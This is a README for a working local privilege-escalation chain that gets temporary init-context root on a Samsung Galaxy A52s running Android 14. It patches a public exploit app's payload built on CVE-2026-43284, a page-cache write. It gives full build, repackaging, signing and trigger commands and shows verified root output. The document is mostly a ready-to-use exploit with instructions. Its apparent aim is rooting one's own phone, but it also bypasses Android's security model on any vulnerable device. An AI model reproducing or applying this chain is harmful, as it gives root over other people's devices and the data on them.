# DirtyInit A52s temporary init-root

This is a working, verified temporary-root chain on:

- Samsung Galaxy A52s 5G `SM-A528B` (`a52sxq`), Snapdragon 778G
- Android 14, kernel `5.4.254-qgki-28575149-abA528BXXSBGYI3`
- locked bootloader, no unlock, no data wipe

It uses the public **DirtyInit** app's CVE-2026-43284 IPsec/ESP
page-cache write to patch `libbase.so`'s `~LogMessage` in the page cache,
then hijacks init's logger to run an in-init relay. The stock payload panics
A52 init; the patch here makes init serve the relay itself.

## Important limitation

`dirtyinit id` reports:

```text
uid=0(root) gid=0(root) groups=3009(readproc) context=u:r:init:s0
```

Commands are executed by the relay in init's context. This is not a normal
interactive shell and init cannot execute arbitrary binaries; the relay
provides file/system commands such as `id`, `cat`, `ls`, `chmod`, `mount`,
`setprop`, and `reboot`.

## Build

1. Download the public DirtyInit APK.
2. Extract `assets/payload_576.bin`.
3. Run:

   ```sh
   python3 patch_payload.py /path/to/payload_576.bin
   ```

4. Replace the asset in the extracted APK.
5. Rebuild with `resources.arsc` stored, `zipalign -p 4`, and sign:

   ```sh
   unzip -q DirtyInit.apk -d apk
   cp payload_576_a52.bin apk/assets/payload_576.bin
   # zip with resources.arsc STORED, then:
   zipalign -p -f 4 apk.zip DirtyInit-a52.apk
   apksigner sign --ks debug.keystore --out DirtyInit-a52-signed.apk DirtyInit-a52.apk
   ```

6. Install, grant All Files Access, open the app, and tap **EXECUTE EXPLOIT**.

## Run

After the app logs:

```text
*** PAGE CACHE MODIFIED — PAYLOAD DEPLOYED ***
```

trigger init's logger, for example:

```sh
adb shell setprop debug.dirtyinit 1
```

On the successful A52 run this command hangs: init's main thread has become
the relay. From a second shell:

```sh
adb shell /data/local/tmp/dirtyinit id
# uid=0(root) gid=0(root) ... context=u:r:init:s0

adb shell /data/local/tmp/dirtyinit cat /proc/1/attr/current
# u:r:init:s0

adb shell /data/local/tmp/dirtyinit reboot -f
```

Do not run `dirtyinit -b` before the relay is active; the bootstrap path can
create an init-named child and trigger the A52 init panic.

## Verified result

```text
dirtyinit id
uid=0(root) gid=0(root) groups=3009(readproc) context=u:r:init:s0

dirtyinit cat /proc/1/attr/current
u:r:init:s0
```

Reboot verification:

```text
before: boot_id 759a9cc2... (exploit boot)
reboot via dirtyinit reboot -f
after: boot_id 4cb51a14-6510-41be-ac76-01e8f79da94e
id: uid=2000(shell)
/dev/.dfi: No such file or directory
```

So the root is temporary and disappears at reboot. No unlock, wipe, or
persistent boot-image change was made.

## Patch rationale

The 576-byte relay payload from the public APK forks a child and relies on a
parent return path that is incompatible with A52's `~LogMessage` prologue.
On A52 the parent path panics init (`Attempted to kill init`,
`pid_namespace.h:90`). The patch removes the fork and makes init serve the
relay in its own main thread; it also avoids the open-error and read-error
exit paths.
